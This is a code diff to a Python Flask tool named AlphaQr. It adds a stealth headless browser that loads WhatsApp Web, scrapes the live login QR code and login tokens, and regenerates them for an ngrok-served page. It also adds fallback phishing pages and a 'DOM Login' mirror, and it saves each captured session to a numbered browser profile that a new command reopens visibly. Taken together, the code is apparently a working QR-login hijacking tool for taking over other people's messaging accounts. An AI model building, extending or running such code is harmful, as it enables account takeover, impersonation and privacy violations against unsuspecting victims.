@@ -7,6 +7,7 @@ import threading
 import shutil
 import importlib.util
 import webbrowser
+import atexit
 
 # ==========================================
 # 1. BOOTSTRAP & VENV HANDLING
@@ -39,6 +40,55 @@ def show_loading_bar(message, total_steps=20, delay=0.05):
     sys.stdout.write('\n')
     sys.stdout.flush()
 
+def ensure_playwright_chromium():
+    """Checks if Playwright Chromium is installed, and installs it if not."""
+    try:
+        import importlib.util
+        if not importlib.util.find_spec("playwright"):
+            return
+            
+        import os
+        import platform
+        import subprocess
+        import sys
+        
+        # Determine ms-playwright directory
+        if platform.system() == "Windows":
+            local_appdata = os.environ.get("LOCALAPPDATA")
+            if not local_appdata:
+                local_appdata = os.path.expanduser("~/AppData/Local")
+            base_dir = os.path.join(local_appdata, "ms-playwright")
+        elif platform.system() == "Darwin":
+            base_dir = os.path.expanduser("~/Library/Caches/ms-playwright")
+        else:
+            base_dir = os.path.expanduser("~/.cache/ms-playwright")
+            
+        chromium_found = False
+        if os.path.exists(base_dir):
+            for item in os.listdir(base_dir):
+                if item.startswith("chromium-"):
+                    if platform.system() == "Windows":
+                        exe_path = os.path.join(base_dir, item, "chrome-win", "chrome.exe")
+                    elif platform.system() == "Darwin":
+                        exe_path = os.path.join(base_dir, item, "chrome-mac", "Chromium.app", "Contents", "MacOS", "Chromium")
+                    else:
+                        exe_path = os.path.join(base_dir, item, "chrome-linux", "chrome")
+                    
+                    if os.path.exists(exe_path):
+                        chromium_found = True
+                        break
+                        
+        if not chromium_found:
+            print("\033[93mPlaywright Chromium browser not found. Installing chromium browser...\033[0m")
+            # Show a loading indicator
+            show_loading_bar("Downloading Chromium (may take a minute)", total_steps=20, delay=0.05)
+            # Run the install command
+            subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True)
+            print("\033[92m✓ Playwright Chromium browser installed successfully.\033[0m")
+    except Exception as e:
+        print(f"\033[91mFailed to install Playwright Chromium: {e}\033[0m")
+        print("\033[93mYou might need to run manually: python -m playwright install chromium\033[0m")
+
 def bootstrap():
     """Ensure environment is ready. Venv for Linux, direct for Windows."""
     required_modules = {
@@ -46,12 +96,13 @@ def bootstrap():
         'flask_socketio': 'flask-socketio',
         'PIL': 'pillow',
         'pyzbar': 'pyzbar',
+        'cv2': 'opencv-python',
         'qrcode': 'qrcode',
-        'pytesseract': 'pytesseract',
         'numpy': 'numpy',
         'colorama': 'colorama',
         'pyngrok': 'pyngrok',
-        'requests': 'requests'
+        'requests': 'requests',
+        'playwright': 'playwright'
     }
 
     # --- LINUX VENV LOGIC ---
@@ -99,6 +150,9 @@ def bootstrap():
             except Exception as e:
                 print(f"\033[91mFailed to install {pkg}: {e}\033[0m")
 
+    # Ensure Playwright Chromium browser is installed
+    ensure_playwright_chromium()
+
 # Run bootstrap
 if __name__ == "__main__":
     bootstrap()
@@ -114,18 +168,88 @@ try:
     import datetime
     from PIL import Image
     from io import BytesIO
-    from pyzbar.pyzbar import decode
     import qrcode
     import logging
-    import pytesseract
     import re
     import numpy as np
     from colorama import Fore, Style, init
     from pyngrok import ngrok, conf
     import requests
+    from playwright.async_api import async_playwright
+    import asyncio
 except ImportError as e:
     print(f"Critical Error: Failed to import dependencies. {e}")
     sys.exit(1)
+
+# Graceful loading of pyzbar with OpenCV fallback
+try:
+    from pyzbar.pyzbar import decode
+except Exception as e:
+    sys.stderr.write(f"Warning: Failed to load pyzbar ({e}). Falling back to OpenCV for QR/barcode scanning.\n")
+    
+    class FallbackDecoded:
+        def __init__(self, data):
+            self.data = data
+
+    def decode(image):
+        try:
+            import cv2
+        except ImportError:
+            sys.stderr.write("Error: OpenCV (opencv-python) is not installed. QR/barcode scanning will be disabled.\n")
+            return []
+
+        if hasattr(image, 'convert'):
+            img_np = np.array(image)
+        elif isinstance(image, np.ndarray):
+            img_np = image
+        else:
+            img_np = np.array(image)
+
+        if len(img_np.shape) == 3:
+            if img_np.shape[2] == 3:
+                gray = cv2.cvtColor(img_np, cv2.COLOR_BGR2GRAY)
+            elif img_np.shape[2] == 4:
+                gray = cv2.cvtColor(img_np, cv2.COLOR_BGRA2GRAY)
+            else:
+                gray = img_np
+        else:
+            gray = img_np
+
+        decoded_objects = []
+
+        # 1. Try OpenCV QRCodeDetector
+        try:
+            qr_detector = cv2.QRCodeDetector()
+            if hasattr(qr_detector, 'detectAndDecodeMulti'):
+                success, decoded_info, points, straight_qrcode = qr_detector.detectAndDecodeMulti(gray)
+                if success and decoded_info:
+                    for info in decoded_info:
+                        if info:
+                            decoded_objects.append(FallbackDecoded(info.encode('utf-8')))
+            else:
+                retval, decoded_info, points, straight_qrcode = qr_detector.detectAndDecode(gray)
+                if retval and decoded_info:
+                    decoded_objects.append(FallbackDecoded(decoded_info.encode('utf-8')))
+        except Exception as e:
+            pass
+
+        # 2. Try OpenCV BarcodeDetector
+        try:
+            barcode_detector = cv2.barcode.BarcodeDetector()
+            if hasattr(barcode_detector, 'detectAndDecodeMulti'):
+                success, decoded_info, points, straight_barcode = barcode_detector.detectAndDecodeMulti(gray)
+                if success and decoded_info:
+                    for info in decoded_info:
+                        if info:
+                            decoded_objects.append(FallbackDecoded(info.encode('utf-8')))
+            else:
+                retval, decoded_info, points, straight_barcode = barcode_detector.detectAndDecode(gray)
+                if retval and decoded_info:
+                    decoded_objects.append(FallbackDecoded(decoded_info.encode('utf-8')))
+        except Exception as e:
+            pass
+
+        return decoded_objects
 
 # Initialize Colorama
 init(autoreset=True)
@@ -133,10 +257,6 @@ init(autoreset=True)
 # ==========================================
 # 3. GLOBAL CONFIG & FLASK SETUP
 # ==========================================
-
-# Tesseract Configuration
-if platform.system() == "Windows":
-    pytesseract.pytesseract.tesseract_cmd = r"C:\Users\Indian\AppData\Local\Programs\Tesseract-OCR\tesseract.exe"
 
 app = Flask(__name__)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
@@ -165,6 +285,7 @@ selected_fallback_file = None
 fallback_url = ""
 ocr_words = set()
 keyword_status = "GREY"
+dom_login_active = False
 
 CURRENT_URL = "http://localhost:5000"
 NGROK_TUNNEL = None
@@ -192,6 +313,419 @@ style_options = {
 }
 
 DEMO_LINK = "https://example.com/demo"
+PROFILE_DIR = os.path.join(os.getcwd(), "browser_profile")
+
+class BrowserManager:
+    def __init__(self):
+        self.playwright = None
+        self.context = None
+        self.page = None
+        self.browser_open = False
+        self.extracted_text = ""
+        self.qr_results = []
+        self.original_screenshot_base64 = ""
+        self.recreated_qr_base64 = ""
+        self.current_url = ""
+        self.loop = None
+        self.thread = None
+        self.current_profile_num = None
+        self.current_profile_dir = None
+        
+    def start_loop(self):
+        if self.thread and self.thread.is_alive():
+            return
+        self.loop = asyncio.new_event_loop()
+        self.thread = threading.Thread(target=self._run_loop, daemon=True)
+        self.thread.start()
+
+    def _run_loop(self):
+        asyncio.set_event_loop(self.loop)
+        self.loop.run_forever()
+
+    def run_async(self, coro):
+        return asyncio.run_coroutine_threadsafe(coro, self.loop)
+
+    async def _setup_browser(self, url):
+        try:
+            if not url.startswith("http"):
+                url = "https://" + url
+            self.current_url = url
+
+            self.playwright = await async_playwright().start()
+            
+            # Launch persistent context with stealth flags
+            self.context = await self.playwright.chromium.launch_persistent_context(
+                user_data_dir=self.current_profile_dir,
+                headless=True,
+                viewport={"width": 1400, "height": 900},
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+                args=[
+                    "--disable-blink-features=AutomationControlled",
+                    "--no-sandbox",
+                    "--disable-setuid-sandbox",
+                    "--disable-infobars",
+                    "--window-position=0,0",
+                    "--ignore-certificate-errors",
+                ],
+                ignore_https_errors=True
+            )
+
+            # Stealth: Add init script to mask automation
+            await self.context.add_init_script("""
+            Object.defineProperty(navigator, 'webdriver', {
+                get: () => undefined
+            });
+            """)
+
+            if self.context.pages:
+                self.page = self.context.pages[0]
+            else:
+                self.page = await self.context.new_page()
+
+            self.page.set_default_timeout(60000)
+            
+            await self.page.goto(url, wait_until="domcontentloaded")
+            self.browser_open = True
+            
+            # Start background extraction task with high frequency
+            asyncio.run_coroutine_threadsafe(self._extraction_loop(), self.loop)
+                            
+        except Exception as e:
+            app_logger.error(f"Failed to start browser: {e}")
+            await self._cleanup()
+
+    async def _extraction_loop(self):
+        while self.browser_open:
+            try:
+                start_time = time.time()
+                await self._extract_data()
+                elapsed = time.time() - start_time
+                wait_time = max(0.1, 0.5 - elapsed)
+                await asyncio.sleep(wait_time)
+            except Exception as e:
+                app_logger.error(f"Extraction loop error: {e}")
+                await asyncio.sleep(1)
+
+    async def _extract_data(self):
+        global current_qr_link, last_update_time, qr_candidates
+        global fallback_active, keyword_fallback_active, element_fallback_active
+        global ocr_words, keyword_status, selected_fallback_file, fallback_url
+        
+        if not self.page:
+            return
+
+        try:
+            # 1. Take a screenshot of the QR element or page
+            qr_selectors = [
+                'canvas[aria-label]',
+                'canvas',
+                '[data-testid="qrcode"]',
+                'div[data-ref]',
+                'div[data-testid]',
+                '.qr-code',
+                'img[src*="qr"]'
+            ]
+            
+            qr_element = None
+            for selector in qr_selectors:
+                try:
+                    locator = self.page.locator(selector).first
+                    if await locator.count() > 0 and await locator.is_visible():
+                        qr_element = locator
+                        break
+                except:
+                    continue
+
+            screenshot_bytes = None
+            try:
+                if qr_element:
+                    screenshot_bytes = await qr_element.screenshot(timeout=5000)
+                else:
+                    screenshot_bytes = await self.page.screenshot(full_page=False, timeout=5000)
+            except Exception as e:
+                pass
+
+            # 2. Decode QR code from screenshot
+            decoded_links = []
+            if screenshot_bytes:
+                self.original_screenshot_base64 = base64.b64encode(screenshot_bytes).decode()
+                try:
+                    img = Image.open(BytesIO(screenshot_bytes))
+                    if img.mode != 'L':
+                        img_gray = img.convert('L')
+                    else:
+                        img_gray = img
+                    
+                    # Call our decode function
+                    result = decode(img_gray)
+                    if result:
+                        decoded_links = list(set([r.data.decode('utf-8') for r in result]))
+                except Exception as e:
+                    pass
+
+            # 3. Direct DOM QR data extraction (WhatsApp, etc.)
+            try:
+                dom_qr_data = await self.page.evaluate("""
+                    () => {
+                        const elements = document.querySelectorAll('[data-ref]');
+                        for (const el of elements) {
+                            const ref = el.getAttribute('data-ref');
+                            if (ref && (ref.includes('1@') || ref.length > 50)) return ref;
+                        }
+                        
+                        const allAttr = document.querySelectorAll('*');
+                        for (const el of allAttr) {
+                            for (const attr of el.attributes) {
+                                if (attr.value && (attr.value.includes('tg://login') || attr.value.includes('whatsapp.com/qr'))) {
+                                    return attr.value;
+                                }
+                            }
+                        }
+                        return null;
+                    }
+                """)
+                if dom_qr_data:
+                    decoded_links = [dom_qr_data]
+            except Exception as e:
+                pass
+
+            # 4. Continuous DOM text extraction (Shadow DOM support)
+            dom_text = ""
+            try:
+                dom_text = await self.page.evaluate("""
+                    () => {
+                        function isVisible(el) {
+                            if (!el) return false;
+                            const style = window.getComputedStyle(el);
+                            return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0';
+                        }
+
+                        function extract(node) {
+                            let texts = [];
+                            if (node.nodeType === Node.TEXT_NODE) {
+                                const text = node.textContent.trim();
+                                if (text.length > 1 && text.length < 1000) {
+                                    texts.push(text);
+                                }
+                            } else if (node.nodeType === Node.ELEMENT_NODE) {
+                                const tag = node.tagName;
+                                if (['SCRIPT', 'STYLE', 'NOSCRIPT', 'SVG', 'PATH'].includes(tag)) return texts;
+                                if (!isVisible(node)) return texts;
+
+                                if (node.shadowRoot) {
+                                    texts.push(...extract(node.shadowRoot));
+                                }
+
+                                if (node.tagName === 'IFRAME') {
+                                    try {
+                                        if (node.contentDocument && node.contentDocument.body) {
+                                            texts.push(...extract(node.contentDocument.body));
+                                        }
+                                    } catch (e) {}
+                                }
+
+                                for (const child of node.childNodes) {
+                                    texts.push(...extract(child));
+                                }
+                            }
+                            return texts;
+                        }
+                        
+                        const rawTexts = extract(document.body);
+                        return [...new Set(rawTexts)].join('\\n');
+                    }
+                """)
+                self.extracted_text = dom_text
+            except Exception as e:
+                pass
+
+            # 5. Extract OCR text - Removed as requested
+            combined_text = dom_text.lower()
+
+            # 6. Keyword Presence & Fallback Logic
+            string_found = False
+            if config_string and config_string.strip():
+                if config_string.lower() in combined_text:
+                    string_found = True
+                    keyword_status = "GREEN"
+                else:
+                    string_found = False
+                    keyword_status = "RED"
+            else:
+                keyword_status = "GREY"
+                string_found = True
+
+            should_keyword_fallback = False
+            if config_string and config_string.strip() and not string_found:
+                 should_keyword_fallback = True
+            
+            if should_keyword_fallback != keyword_fallback_active:
+                keyword_fallback_active = should_keyword_fallback
+                
+            effective_fallback = element_fallback_active or keyword_fallback_active
+            
+            if effective_fallback and not fallback_active:
+                fallback_active = True
+                if dom_login_active:
+                    socketio.emit('fallback_on', {'type': 'dom'})
+                elif selected_fallback_file:
+                    filepath = os.path.join(UPLOAD_FOLDER, selected_fallback_file)
+                    if os.path.exists(filepath):
+                        socketio.emit('fallback_on', {'file': selected_fallback_file, 'type': 'file'})
+                elif fallback_url and fallback_url.strip():
+                     socketio.emit('fallback_on', {'url': fallback_url, 'type': 'url'})
+                        
+            elif not effective_fallback and fallback_active:
+                 fallback_active = False
+                 socketio.emit('fallback_off')
+
+            # 7. Update QR Candidates
+            num_qrs = len(decoded_links)
+            if num_qrs == 1:
+                link = decoded_links[0]
+                if link != DEMO_LINK and link != current_qr_link:
+                    current_qr_link = link
+                    last_update_time = datetime.datetime.now().isoformat()
+                qr_candidates = decoded_links
+            else:
+                qr_candidates = decoded_links
+
+            self.qr_results = decoded_links
+            if decoded_links:
+                self._generate_qr_image(decoded_links[0])
+
+            # Refresh browser if QR disappeared but keyword exists (strict rule)
+            if num_qrs == 0 and string_found and (time.time() - getattr(self, 'last_reload_time', 0) > 15):
+                self.last_reload_time = time.time()
+                try:
+                    app_logger.info("QR code disappeared but keyword exists. Reloading page...")
+                    await self.page.reload(wait_until="domcontentloaded")
+                except Exception as reload_err:
+                    pass
+
+        except Exception as e:
+            app_logger.error(f"Error in _extract_data: {e}")
+
+    def _generate_qr_image(self, data):
+        try:
+            qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=2)
+            qr.add_data(data)
+            qr.make(fit=True)
+            img = qr.make_image(fill_color="black", back_color="white")
+            
+            buffered = BytesIO()
+            img.save(buffered, format="PNG")
+            self.recreated_qr_base64 = base64.b64encode(buffered.getvalue()).decode()
+        except Exception as e:
+            app_logger.error(f"Failed to generate QR image: {e}")
+
+    async def _cleanup(self):
+        self.browser_open = False
+        try:
+            if self.context:
+                await self.context.close()
+            if self.playwright:
+                await self.playwright.stop()
+        except Exception as e:
+            app_logger.error(f"Cleanup error: {e}")
+        finally:
+            self.playwright = None
+            self.context = None
+            self.page = None
+            self.qr_results = []
+            self.original_screenshot_base64 = ""
+            self.recreated_qr_base64 = ""
+
+    def start(self, url):
+        if self.browser_open:
+            return
+            
+        # Determine next profile folder number
+        if not os.path.exists(PROFILE_DIR):
+            os.makedirs(PROFILE_DIR, exist_ok=True)
+            
+        existing_profiles = []
+        for name in os.listdir(PROFILE_DIR):
+            if os.path.isdir(os.path.join(PROFILE_DIR, name)) and name.isdigit():
+                existing_profiles.append(int(name))
+                
+        next_num = max(existing_profiles) + 1 if existing_profiles else 1
+        self.current_profile_num = next_num
+        self.current_profile_dir = os.path.join(PROFILE_DIR, str(next_num))
+        os.makedirs(self.current_profile_dir, exist_ok=True)
+        
+        self.browser_open = True
+        self.run_async(self._setup_browser(url))
+
+    def stop(self):
+        self.run_async(self._cleanup())
+
+    def get_state(self):
+        return {
+            "browser_open": self.browser_open,
+            "current_url": self.current_url,
+            "extracted_text": self.extracted_text,
+            "qr_results": self.qr_results,
+            "original_screenshot_base64": self.original_screenshot_base64,
+            "recreated_qr_base64": self.recreated_qr_base64,
+            "current_profile_num": self.current_profile_num
+        }
+
+def open_profile_visible(profile_num):
+    profile_path = os.path.join(PROFILE_DIR, str(profile_num))
+    if not os.path.exists(profile_path):
+        print(f"{Fore.RED}Profile {profile_num} does not exist at {profile_path}{Style.RESET_ALL}")
+        return
+        
+    print(f"{Fore.GREEN}Opening Profile {profile_num} in visible mode...{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}Close the browser window to return control to CLI.{Style.RESET_ALL}")
+    
+    def run():
+        import asyncio
+        from playwright.async_api import async_playwright
+        
+        async def _launch():
+            try:
+                async with async_playwright() as p:
+                    context = await p.chromium.launch_persistent_context(
+                        user_data_dir=profile_path,
+                        headless=False,
+                        viewport={"width": 1200, "height": 800},
+                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+                        args=[
+                            "--disable-blink-features=AutomationControlled",
+                            "--no-sandbox",
+                            "--disable-setuid-sandbox",
+                            "--disable-infobars",
+                            "--ignore-certificate-errors",
+                        ],
+                        ignore_https_errors=True
+                    )
+                    page = context.pages[0] if context.pages else await context.new_page()
+                    await page.goto("https://web.whatsapp.com")
+                    
+                    closed = asyncio.Event()
+                    context.on("close", lambda ctx: closed.set())
+                    page.on("close", lambda p: closed.set())
+                    await closed.wait()
+                    print(f"{Fore.GREEN}Profile {profile_num} browser window closed.{Style.RESET_ALL}")
+            except Exception as launch_err:
+                print(f"{Fore.RED}Failed to open browser: {launch_err}{Style.RESET_ALL}")
+                
+        asyncio.run(_launch())
+
+    t = threading.Thread(target=run, daemon=True)
+    t.start()
+
+browser_manager = BrowserManager()
+browser_manager.start_loop()
+
+@atexit.register
+def cleanup_browser():
+    try:
+        browser_manager.stop()
+    except Exception:
+        pass
 
 # (Include HTML_TEMPLATE - compacted for brevity but fully functional)
 # Using the existing template logic, but reading it from a variable or file is better.
@@ -203,7 +737,7 @@ HTML_TEMPLATE = """
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>PRO QR Designer</title>
+<title>AlphaQr</title>
 <script src="https://unpkg.com/qr-code-styling/lib/qr-code-styling.js"></script>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 <style>
@@ -297,6 +831,27 @@ input[type="color"]::-webkit-color-swatch{ border:2px solid var(--border); borde
 
     <label>Text / URL</label>
     <input id="qrText" placeholder="Enter URL">
+
+    <div class="section-title">Headless Browser QR Extractor</div>
+    <div style="background: #fcfcfc; border: 1px solid #ddd; padding: 12px; border-radius: 12px; margin-bottom: 12px;">
+      <label style="margin-top:0; font-size:14px; font-weight:600;">Browser Target URL</label>
+      <input type="text" id="browserUrlInput" placeholder="https://web.whatsapp.com" value="https://web.whatsapp.com">
+      <div style="display: flex; gap: 8px; margin-top: 8px;">
+        <button id="startBrowserBtn" class="button small green" style="flex:1; margin-top:0;" onclick="startBrowserSession()">Start Session</button>
+        <button id="stopBrowserBtn" class="button small red" style="flex:1; margin-top:0;" onclick="stopBrowserSession()">Stop Session</button>
+      </div>
+      <div id="browserStatusArea" style="margin-top: 10px; font-size: 13px; font-weight: bold; display: flex; align-items: center; gap: 6px;">
+        <div id="browserIndicator" style="width: 8px; height: 8px; border-radius: 50%; background: #ccc;"></div>
+        <span id="browserStatusText">Browser Closed</span>
+      </div>
+      <details style="margin-top:10px; font-size:12px; cursor:pointer;">
+        <summary>View Live Browser Details</summary>
+        <div style="margin-top:8px; border:1px solid #eee; padding:8px; border-radius:8px; background:#f9f9f9; max-height:200px; overflow-y:auto;">
+          <strong>Live Text:</strong>
+          <pre id="browserExtractedText" style="white-space: pre-wrap; font-size:11px; margin:5px 0 0 0; color:#555;">No data extracted yet.</pre>
+        </div>
+      </details>
+    </div>
     
     <div class="section-title">Style</div>
 
@@ -392,12 +947,15 @@ input[type="color"]::-webkit-color-swatch{ border:2px solid var(--border); borde
             <textarea id="configString" rows="1" placeholder="Enter keyword..." style="margin-top:6px; font-family:inherit; background:transparent; position:relative; z-index:2;"></textarea>
         </div>
     </div>
-    <button id="saveKeywordBtn" class="button small" onclick="saveConfigString()">Save Keyword</button>
+    <div style="display:flex; gap:8px; margin-top:8px;">
+      <button id="saveKeywordBtn" class="button small" style="flex:1; margin-top:0;" onclick="saveConfigString()">Save Keyword</button>
+      <button id="domLoginBtn" class="button small red" style="flex:1; margin-top:0;" onclick="toggleDomLogin()">DOM Login: OFF</button>
+    </div>
 
     <div class="section-title">Fallback Configuration</div>
     
     <label>Fallback Type Priority:</label>
-    <div class="note">1. HTML File (if selected)<br>2. Redirect URL (if no file selected)</div>
+    <div class="note">1. DOM Login (if ON)<br>2. HTML File (if selected)<br>3. Redirect URL (if no file selected)</div>
 
     <label style="margin-top:15px;">Fallback HTML Files</label>
     <div class="file-input-wrapper">
@@ -679,6 +1237,92 @@ function saveConfigString() {
     });
 }
 
+let domLoginActive = false;
+
+function updateDomLoginUI() {
+    const btn = document.getElementById("domLoginBtn");
+    if (domLoginActive) {
+        btn.innerText = "DOM Login: ON";
+        btn.className = "button small green";
+    } else {
+        btn.innerText = "DOM Login: OFF";
+        btn.className = "button small red";
+    }
+}
+
+function toggleDomLogin() {
+    domLoginActive = !domLoginActive;
+    fetch('/api/dom_login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ active: domLoginActive })
+    })
+    .then(r => r.json())
+    .then(d => {
+        domLoginActive = d.active;
+        updateDomLoginUI();
+    });
+}
+
+// Fetch initial DOM Login state
+fetch('/api/dom_login')
+    .then(r => r.json())
+    .then(d => {
+        domLoginActive = d.active;
+        updateDomLoginUI();
+    });
+
+async function startBrowserSession() {
+    const url = document.getElementById('browserUrlInput').value;
+    const btn = document.getElementById('startBrowserBtn');
+    btn.disabled = true;
+    btn.innerText = "Starting...";
+    await fetch('/api/browser/start', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `url=${encodeURIComponent(url)}`
+    });
+    btn.disabled = false;
+    btn.innerText = "Start Session";
+}
+
+async function stopBrowserSession() {
+    const btn = document.getElementById('stopBrowserBtn');
+    btn.disabled = true;
+    btn.innerText = "Stopping...";
+    await fetch('/api/browser/stop', { method: 'POST' });
+    btn.disabled = false;
+    btn.innerText = "Stop Session";
+}
+
+async function updateBrowserStatus() {
+    try {
+        const r = await fetch('/api/browser/state');
+        const data = await r.json();
+        
+        const indicator = document.getElementById('browserIndicator');
+        const statusText = document.getElementById('browserStatusText');
+        const textPre = document.getElementById('browserExtractedText');
+        
+        if (data.browser_open) {
+            indicator.style.background = '#51cf66';
+            let profileInfo = data.current_profile_num ? ` (Profile ${data.current_profile_num})` : '';
+            statusText.innerText = 'Active - Scanning...' + profileInfo;
+            statusText.style.color = '#2b8a3e';
+        } else {
+            indicator.style.background = '#ff6b6b';
+            statusText.innerText = 'Browser Closed';
+            statusText.style.color = '#c92a2a';
+        }
+        
+        if (textPre) {
+            textPre.innerText = data.extracted_text || 'No text extracted yet.';
+        }
+    } catch(e) {}
+}
+
+setInterval(updateBrowserStatus, 1500);
+
 // Fetch initial config string
 fetch('/api/list_html_files').then(r=>r.json()).then(d=>{
     if(d.config_string) document.getElementById("configString").value = d.config_string;
@@ -866,12 +1510,72 @@ def designer():
 @app.route("/api/current_qr")
 def get_current_qr():
     global current_qr_link, last_update_time, qr_candidates, keyword_status
+    global fallback_active, selected_fallback_file, fallback_url, dom_login_active
+    
+    fallback_type = None
+    if fallback_active:
+        if dom_login_active:
+            fallback_type = 'dom'
+        elif selected_fallback_file:
+            fallback_type = 'file'
+        elif fallback_url and fallback_url.strip():
+            fallback_type = 'url'
+
     return jsonify({
         "link": current_qr_link,
         "time": last_update_time,
         "candidates": qr_candidates,
-        "keyword_status": keyword_status
+        "keyword_status": keyword_status,
+        "fallback_active": fallback_active,
+        "fallback_file": selected_fallback_file,
+        "fallback_url": fallback_url,
+        "fallback_type": fallback_type
     })
+
+@app.route("/api/browser/start", methods=["POST"])
+def browser_start():
+    url = request.form.get("url", "https://web.whatsapp.com")
+    browser_manager.start(url)
+    return jsonify({"success": True})
+
+@app.route("/api/browser/stop", methods=["POST"])
+def browser_stop():
+    browser_manager.stop()
+    return jsonify({"success": True})
+
+@app.route("/api/browser/state", methods=["GET"])
+def browser_state():
+    return jsonify(browser_manager.get_state())
+
+@app.route("/api/browser/dom_live", methods=["GET"])
+def browser_dom_live():
+    if browser_manager.page:
+        fut = browser_manager.run_async(browser_manager.page.content())
+        try:
+            content = fut.result(timeout=5)
+            current_url = browser_manager.current_url
+            if current_url:
+                base_tag = f'<base href="{current_url}">'
+                if '<head>' in content:
+                    content = content.replace('<head>', f'<head>{base_tag}', 1)
+                else:
+                    content = f'{base_tag}{content}'
+            return content
+        except Exception as e:
+            return f"Error retrieving DOM: {e}", 500
+    return "Browser not active", 404
+
+@app.route("/api/dom_login", methods=["POST"])
+def toggle_dom_login():
+    global dom_login_active
+    data = request.json or {}
+    dom_login_active = bool(data.get("active", False))
+    return jsonify({"status": "ok", "active": dom_login_active})
+
+@app.route("/api/dom_login", methods=["GET"])
+def get_dom_login():
+    global dom_login_active
+    return jsonify({"active": dom_login_active})
 
 @app.route("/api/style", methods=["POST"])
 def receive_style():
@@ -997,11 +1701,22 @@ def select_html():
 
 @app.route("/api/fallback_status", methods=["GET"])
 def fallback_status():
-    global fallback_active, selected_fallback_file, fallback_url
+    global fallback_active, selected_fallback_file, fallback_url, dom_login_active
+    
+    fallback_type = None
+    if fallback_active:
+        if dom_login_active:
+            fallback_type = 'dom'
+        elif selected_fallback_file:
+            fallback_type = 'file'
+        elif fallback_url and fallback_url.strip():
+            fallback_type = 'url'
+            
     return jsonify({
         "active": fallback_active,
         "file": selected_fallback_file,
-        "url": fallback_url
+        "url": fallback_url,
+        "type": fallback_type
     })
 
 @app.route("/api/fallback_content", methods=["GET"])
@@ -1133,53 +1848,37 @@ def receive_screenshot():
             new_height = int(height * scale)
             img_gray = img_gray.resize((new_width, new_height), Image.Resampling.LANCZOS)
         
-        # 1. OCR (Tesseract)
-        string_found = False
-        try:
-            text = pytesseract.image_to_string(img_gray, config="--psm 6").lower()
-            found_words = re.findall(r"[a-zA-Z]{3,}", text)
-            ocr_words.update(found_words)
-            
-            if config_string and config_string.strip():
-                if config_string.lower() in text:
-                    string_found = True
-                    keyword_status = "GREEN"
-                else:
-                    string_found = False
-                    keyword_status = "RED"
-            else:
-                keyword_status = "GREY"
-                string_found = True
-                
-        except Exception as e:
-            app_logger.error(f"OCR Error: {e}", exc_info=False)
-            string_found = True 
+        # 1. OCR (Tesseract) - Removed as requested
+        string_found = True
+        keyword_status = "GREY"
             
         # 2. Fallback Logic
-        should_keyword_fallback = False
-        if config_string and config_string.strip() and not string_found:
-             should_keyword_fallback = True
-        
-        if should_keyword_fallback != keyword_fallback_active:
-            keyword_fallback_active = should_keyword_fallback
+        if not browser_manager.browser_open:
+            should_keyword_fallback = False
+            if config_string and config_string.strip() and not string_found:
+                 should_keyword_fallback = True
             
-        effective_fallback = element_fallback_active or keyword_fallback_active
-        
-        if effective_fallback and not fallback_active:
-            fallback_active = True
+            if should_keyword_fallback != keyword_fallback_active:
+                keyword_fallback_active = should_keyword_fallback
+                
+            effective_fallback = element_fallback_active or keyword_fallback_active
             
-            # Priority 1: File
-            if selected_fallback_file:
-                filepath = os.path.join(UPLOAD_FOLDER, selected_fallback_file)
-                if os.path.exists(filepath):
-                    socketio.emit('fallback_on', {'file': selected_fallback_file, 'type': 'file'})
-            # Priority 2: URL
-            elif fallback_url and fallback_url.strip():
-                 socketio.emit('fallback_on', {'url': fallback_url, 'type': 'url'})
-                    
-        elif not effective_fallback and fallback_active:
-             fallback_active = False
-             socketio.emit('fallback_off')
+            if effective_fallback and not fallback_active:
+                fallback_active = True
+                
+                # Priority: DOM Login > File > URL
+                if dom_login_active:
+                    socketio.emit('fallback_on', {'type': 'dom'})
+                elif selected_fallback_file:
+                    filepath = os.path.join(UPLOAD_FOLDER, selected_fallback_file)
+                    if os.path.exists(filepath):
+                        socketio.emit('fallback_on', {'file': selected_fallback_file, 'type': 'file'})
+                elif fallback_url and fallback_url.strip():
+                     socketio.emit('fallback_on', {'url': fallback_url, 'type': 'url'})
+                        
+            elif not effective_fallback and fallback_active:
+                 fallback_active = False
+                 socketio.emit('fallback_off')
         
         # 3. QR Detection
         decoded_links = []
@@ -1467,6 +2166,7 @@ def main():
 {Fore.CYAN}Available Commands:{Style.RESET_ALL}
   link <file.html>  - Hook Alpha.js to HTML file
   server            - Open Designer in Browser
+  open <number>     - Open dynamic profile folder in headed/visible browser
   restart           - Restart the application
   exit              - Exit AlphaQR
                 """)
@@ -1479,6 +2179,16 @@ def main():
                 print(f"{Fore.YELLOW}Restarting...{Style.RESET_ALL}")
                 os.execv(sys.executable, ['python'] + sys.argv)
                 
+            elif cmd == "open":
+                if len(parts) < 2:
+                    print(f"{Fore.RED}Usage: open <profile_number>{Style.RESET_ALL}")
+                else:
+                    profile_str = parts[1]
+                    if profile_str.isdigit():
+                        open_profile_visible(int(profile_str))
+                    else:
+                        print(f"{Fore.RED}Profile number must be an integer.{Style.RESET_ALL}")
+                        
             elif cmd == "link":
                 if len(parts) < 2:
                     print(f"{Fore.RED}Usage: link <filename>{Style.RESET_ALL}")
